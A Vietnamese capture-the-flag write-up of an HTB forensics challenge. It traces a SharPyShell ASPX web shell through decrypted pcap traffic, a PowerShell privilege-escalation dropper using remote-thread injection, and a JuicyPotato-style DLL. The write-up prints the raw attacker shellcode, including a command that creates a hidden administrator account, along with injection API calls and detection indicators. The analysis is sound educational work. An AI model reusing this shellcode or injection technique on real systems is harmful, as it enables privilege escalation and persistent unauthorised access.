---
title: HTB Window's Infinity Edge
published: 2025-07-24
description: This is one of challenge which I liked the most of HTB series
tags: [Debugging, Traffic Analysis]
category: Shellcode
draft: false
---

# HTB Window's Infinity Edge
>author : kAiZ3n
>Decription : A motivated APT group has breached our company and utilized custom tooling. We've identified the implants on compromised systems and remediated the infection using advanced AntiVirus X. However, one server seems clean but has been exhibiting suspicious traffic. Can you spot something we could have missed while cleaning this system?
## Xử lý file pcap
![image](./markdown/HyUa_qAIlx.png)

- Đầu tiên ta thấy Client gửi request tới server thông qua format multi data và ta thấy client đã Post một file upload.apsx thông qua /upload
tại lúc xử lý file tôi thấy nó sử dụng một Class Assembly.Load() đây được coi là red flag thường được dùng load các mal EXE or DLL
- Tạo môt Instance để runtime trong .NET
- sau đó nó sẽ truyền parameter vào là p and r
- p là dữ liệu người dùng trong requestFrom từ "data"
- r là hardcode 
![payload](./markdown/HJtyO90Lge.jpg)
trích xuất ra file payload.exe check file nhanh với die thì đây là file .NET load vào ILSPY để đọc source
![image](./markdown/S1i4O90Lxx.png)

- RequestForm["data"] là phân vùng bị enc code
- r là password như một hardcode key
- iv = "infinity_edgehtb" (hardcode)
- Attacker sẽ gửi payload ExecRunTime đã bị mã hóa thông qua RequestFrom['data']
- sau đó sẽ dùng key và iv decrypt và thực thi với Invoke
## Decryption Traffic
Check file pcap với các trường data= được gửi trong file shell.apsx
![image](https://hackmd.io/_uploads/rJrB5cCLlg.png)

![image](https://hackmd.io/_uploads/SkUNq9ALex.png)

Đây là script tôi xử lý
![decrypt](https://hackmd.io/_uploads/H1ilcqAUxg.jpg)

## Phân tích Traffic PlainText
Format output trong file Decrypt.bin
![image](https://hackmd.io/_uploads/HJnqq9ALll.png)
Đúng như idea ban đâu mỗi lần Request payload sẽ có một class SharPyShell và func ExecRunTime để Invoke và thực thi trên server theo như logic file NET


### Tiếp theo nó sẽ Drop một tool powershell script dùng để leo quyền (Privilege Escalation)
Spawn một cái powershell 
![payloadshell](https://hackmd.io/_uploads/SJxKCHALee.jpg)


![image](https://hackmd.io/_uploads/ByQU8IpLge.png)
Decrypt payload với base sau đó Xor với key
và chạy tools với các đối số 
Output 
![image](https://hackmd.io/_uploads/SJECLIaIlg.png)


### Xử lý Shellcode
Trong Script được gửi bởi attacker thì có 2 function InjectionShellcodeAsUser và InjectionShellcode

![payloadshell](https://hackmd.io/_uploads/SkyA3BCIxl.jpg)

snapshort ThreadParametes được truyền vào
![image](https://hackmd.io/_uploads/B1wgqGpIle.png)
1. Đăng nhập với user
2. Tạo một Process cmd.exe hoặc nếu Process có sẳn sẽ lấy PID được truyền vào hàm Injection Shellcode 
Mở Handle targetProcessHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, processId); đóng vai trò Spawn Host cho DLL
3. Tính size và allocate shellcode vào memory và tính toán offset trong Memory với VirtualAllocA() và ghi shellcode vào vùng nhớ đó trong Process với WriteMemory() 
**IntPtr codeMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, codeMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);**

4. Tạo thread trong tiến trình cmd.exe:
Tạo RemoteThread chạy shellcode tại codeMemAddress, truyền threadParameterAddress vào.

**Đây gọi là kỹ thuật RemoteThread Injection**
**Tương tự cho InjectionShellcode**

### Phân tích shellcode DLL với IDAPro
**Tại điểm này call InjectShellcode với Entry 0x2880**

Chương trình sẽ gọi tới EntryPoint

![image](https://hackmd.io/_uploads/BkVx6B08xl.png)
Chương trình sẽ parser input và truyền vào hàm Juicy với phần payload shellcode
```
ThreadParameter:
    [filepath]\0
    [application_name]\0
    [CLSID]\0
    [port_Source]\0
    [ip_source]\0
    [port Destination]\0
    [ip_Dest]\0
    [Size of Payload Shellcode]\0
    [string_after_number]

```
### Parser ThreadParameter
![code](https://hackmd.io/_uploads/BJYD9BRLel.png)
```
Output:
[+] Parsed Data:
  filepath: C:\Windows\Temp\x1fvogijp5pyzn7\9nu8w1q
  application_name: notepad.exe
  clsid: {4991d34b-80a1-4291-83b6-3328366b9097}
  port_or_id: 48278
  ip_source: 127.0.0.1
  extra_wstring: 135
  copied_ascii: 127.0.0.1
  Juicy Payload size: 402
  juicy_payload: b'\xfcH\x83\xe4\xf0\xe8\xc0\x00\x00\x00AQAPRQVH1\xd2eH\x8bR`H\x8bR\x18H\x8bR H\x8brPH\x0f\xb7JJM1\xc9H1\xc0\xac<a|\x02, A\xc1\xc9\rA\x01\xc1\xe2\xedRAQH\x8bR \x8bB<H\x01\xd0\x8b\x80\x88\x00\x00\x00H\x85\xc0tgH\x01\xd0P\x8bH\x18D\x8b@ I\x01\xd0\xe3VH\xff\xc9A\x8b4\x88H\x01\xd6M1\xc9H1\xc0\xacA\xc1\xc9\rA\x01\xc18\xe0u\xf1L\x03L$\x08E9\xd1u\xd8XD\x8b@$I\x01\xd0fA\x8b\x0cHD\x8b@\x1cI\x01\xd0A\x8b\x04\x88H\x01\xd0AXAX^YZAXAYAZH\x83\xec AR\xff\xe0XAYZH\x8b\x12\xe9W\xff\xff\xff]H\xba\x01\x00\x00\x00\x00\x00\x00\x00H\x8d\x8d\x01\x01\x00\x00A\xba1\x8bo\x87\xff\xd5\xbb\xf0\xb5\xa2VA\xba\xa6\x95\xbd\x9d\xff\xd5H\x83\xc4(<\x06|\n\x80\xfb\xe0u\x05\xbbG\x13roj\x00YA\x89\xda\xff\xd5cmd /c "net user /add admin_infinity ""Password2!"" /Y & net localgroup Administrators admin_infinity /add & echo xGk89_Ew > C:\\xor.k"\x00'
```
trong Hàm Juicy có tạo một Thread với function StartAddress cho việc xử lý Connection Network
và tại hàm Juicy tiếp quy trình Spawn Host Process và Injection Shellcode với **CreateRemoteThread**
![image](https://hackmd.io/_uploads/SJwmASRIll.png)
**Thành phần	Mục đích**
- a1 (CLSID)	Gọi COM trigger để lấy token SYSTEM
- a3, a4 (payload, size)	Shellcode được inject vào process mới
- CoGetInstanceFromIStorage	Trigger đối tượng COM
- CreateProcessWithTokenW / CreateProcessAsUser	Tạo process với token SYSTEM
WriteProcessMemory + CreateRemoteThread	Inject và thực thi payload

**Dấu hiệu tấn công / detection**
- Tạo ILockBytes, IStorage giả.
- Gọi CoGetInstanceFromIStorage với CLSID lạ.
- CreateProcessWithTokenW + VirtualAllocEx + WriteProcessMemory
- CLSID thường là COM hijack hoặc UAC bypass trigger.

Dump shellcode payload juicy ra va dung Floss
![image](https://hackmd.io/_uploads/ryhHZURLgl.png)
### InjectShellcodeAs be called và xử lý với x64dbg
![InjectShellcodeAS](https://hackmd.io/_uploads/Skd2W8CLlx.png)
![image](https://hackmd.io/_uploads/ry_lMU0Lgg.png)
shellcode này có dung tệp C:\xor.k được  tạo từ shellcode juicy payload
tôi sử dụng shcode2.py để convert shellcode.bin to EXE và debug nó trong x64dbg
![image](https://hackmd.io/_uploads/B1axpKAUee.png)
ngay tại điểm đầu code nó đã call một function và ta thấy các giá trị "C:\xor.k được hiển thị"
![image](https://hackmd.io/_uploads/S1Q2pFRUge.png)
Thử debug và chương trình đã bị crash ở vùn đọc file tôi nghĩ do không thể truy cập vùng nhớ lúc đọc file và tôi sẽ cấp quyền cho 2 vùng nhớ [rsp+10] và [rsp+20] sau đó debug tiếp
Tại offset 
```
mov qword ptr ss:[rsp+10h] ,rbx 
```
cấp quyền Write cho phân vùng này của kernel32 để sử dụng WriteFile/ReadFile ghi dữ liệu
![image](https://hackmd.io/_uploads/B1GLmqR8lx.png)
ER-- to ERW--
Tại offset
```
mov qword ptr ss:[rsp+20], r9
```
cấp quyền cho phân vùng r9
![image](https://hackmd.io/_uploads/SyJy4qRLxg.png)
![image](https://hackmd.io/_uploads/r1Sb450Uxe.png)
của .text file shel2.exe cho phép đọc và ghi dữ liệu
Do không có quyền truy cập vùng nhớ file và tôi phải patch nên dữ liệu đọc được sẽ là giá trị rác
![image](https://hackmd.io/_uploads/BJ2erqRLgx.png)

đặt breakpoint ở offset = 00007FF6214B1145
Fix lại giá trị rác của [rsp+161]
```
FF FE 78 00 47 00 6B 00 -> xGk89_Ew
```
vì thế đến đoạn xử lý [rsp+161] được coi là buffer of File tôi sẽ điền value file ở đó
và tiếp tục xor để lấy flag
![image](https://hackmd.io/_uploads/SkTrrqA8xg.png)

PS: Bài này mình thấy khá là nặng về Obfuscation và Reverse Engineering nếu như intend solution không cần phải guessy
